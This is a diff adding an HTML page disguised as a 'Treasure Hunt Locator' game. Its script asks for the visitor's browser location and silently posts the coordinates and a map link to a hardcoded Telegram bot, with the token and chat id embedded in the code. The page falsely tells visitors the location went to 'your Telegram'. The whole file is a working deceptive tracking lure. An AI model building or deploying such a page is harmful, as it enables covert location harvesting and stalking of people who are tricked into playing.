@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Treasure Hunt Locator</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right, #141e30, #243b55);
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+      text-align: center;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 10px #000;
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 40px;
+    }
+
+    button {
+      background: gold;
+      color: black;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: transform 0.3s ease, background 0.3s ease;
+      box-shadow: 0 4px 10px rgba(255, 215, 0, 0.4);
+    }
+
+    button:hover {
+      background: orange;
+      transform: scale(1.1);
+    }
+
+    .treasure-icon {
+      font-size: 50px;
+      margin-bottom: 20px;
+      animation: bounce 2s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+  </style>
+</head>
+<body>
+  <div class="treasure-icon">💰</div>
+  <h1>Find the Treasure Near You!</h1>
+  <p>Tap the button below to begin your hunt!</p>
+  <button onclick="requestLocation()">Start Finding</button>
+
+  <script>
+    async function requestLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          async function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 Treasure Seeker's Location:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${mapLink}`;
+
+            const botToken = '7592762647:AAGk_PjuVSCAvjsafvxFWxxKTIipRtzv64M';
+            const chatId = '5099451464';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+              const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: message
+                })
+              });
+
+              if (response.ok) {
+                alert("🎉 Location sent to your Telegram!");
+              } else {
+                alert("❌ Failed to send location to Telegram.");
+              }
+            } catch (error) {
+              alert("⚠️ Error sending location: " + error.message);
+            }
+          },
+          function(error) {
+            alert("❌ Location access denied: " + error.message);
+          }
+        );
+      } else {
+        alert("Geolocation is not supported by your browser.");
+      }
+    }
+  </script>
+</body>
+</html>
